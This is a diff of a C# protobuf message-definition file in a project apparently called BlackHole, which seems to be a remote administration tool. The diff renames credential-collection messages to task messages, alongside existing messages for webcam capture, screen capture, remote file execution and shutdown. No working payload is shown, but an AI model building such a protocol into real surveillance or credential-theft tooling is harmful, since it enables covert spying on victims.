@@ -145,24 +145,30 @@ namespace BlackHole.Common.Network.Protocol
     }
 
     [ProtoContract(ImplicitFields = ImplicitFields.AllPublic)]
-    public sealed class StartCredentialsMessage : NetMessage
+    public sealed class StartTasksMessage : NetMessage
     {
         //
     }
 
     [ProtoContract(ImplicitFields = ImplicitFields.AllPublic)]
-    public sealed class CredentialsMessage : NetMessage
+    public sealed class TasksMessage : NetMessage
     {
-        public DictionaryWrapper<string, string>[] Credentials { get; set; }
+        public DictionaryWrapper<string, string>[] Tasks { get; set; }
 
-        public CredentialsMessage()
+        public TasksMessage()
         {
         }
 
-        public CredentialsMessage(Dictionary<string, string>[] dicts)
+        public TasksMessage(Dictionary<string, string>[] dicts)
         {
-            Credentials = dicts.Select(d => new DictionaryWrapper<string, string>(d)).ToArray();
+            Tasks = dicts.Select(d => new DictionaryWrapper<string, string>(d)).ToArray();
         }
+    }
+
+    [ProtoContract(ImplicitFields = ImplicitFields.AllPublic)]
+    public sealed class StopTasksMessage : NetMessage
+    {
+        //
     }
 
     [ProtoContract(ImplicitFields = ImplicitFields.AllPublic)]
@@ -190,11 +196,6 @@ namespace BlackHole.Common.Network.Protocol
         public int FrameRate { get; set; }
     }
 
-    [ProtoContract(ImplicitFields = ImplicitFields.AllPublic)]
-    public sealed class TaskListMessage : NetMessage
-    {
-        
-    }
 
     // ====================================
     // ================= Data =============
@@ -233,13 +234,12 @@ namespace BlackHole.Common.Network.Protocol
         public string Size { get; set; }
     }
 
-
-    [ProtoInclude(1023, typeof(TaskListMessage))]
+    [ProtoInclude(1023, typeof(StopTasksMessage))]
     [ProtoInclude(1022, typeof(WebcamCaptureMessage))]
     [ProtoInclude(1021, typeof(StopWebcamCaptureMessage))]
     [ProtoInclude(1020, typeof(StartWebcamCaptureMessage))]
-    [ProtoInclude(1019, typeof(CredentialsMessage))]
-    [ProtoInclude(1018, typeof(StartCredentialsMessage))]
+    [ProtoInclude(1019, typeof(TasksMessage))]
+    [ProtoInclude(1018, typeof(StartTasksMessage))]
     [ProtoInclude(1017, typeof(ShutdownMessage))]
     [ProtoInclude(1016, typeof(ExecuteFileMessage))]
     [ProtoInclude(1015, typeof(StopScreenCaptureMessage))]
